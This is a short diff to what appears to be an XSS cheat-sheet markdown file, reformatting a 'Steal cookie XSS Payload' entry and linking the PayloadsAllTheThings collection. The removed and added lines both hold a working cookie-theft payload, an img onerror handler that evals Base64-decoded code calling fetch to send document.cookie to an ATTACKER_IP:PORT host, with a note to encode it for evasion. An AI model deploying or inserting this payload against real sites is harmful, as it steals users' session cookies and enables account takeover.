@@ -10,7 +10,9 @@
 
 ### Steal cookie XSS Payload: 
 
-    <img src=x onerror='eval(atob("fetch('http://ATTACKER_IP:PORT/?cookie='+document.cookie)"));' /> (ENCODE THE ATOB PAYLOAD IN BASE64)
+Encode the atob() payload in Base64
+
+    <img src=x onerror='eval(atob("fetch('http://ATTACKER_IP:PORT/?cookie='+document.cookie)"));' /> 
 
 ## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
 
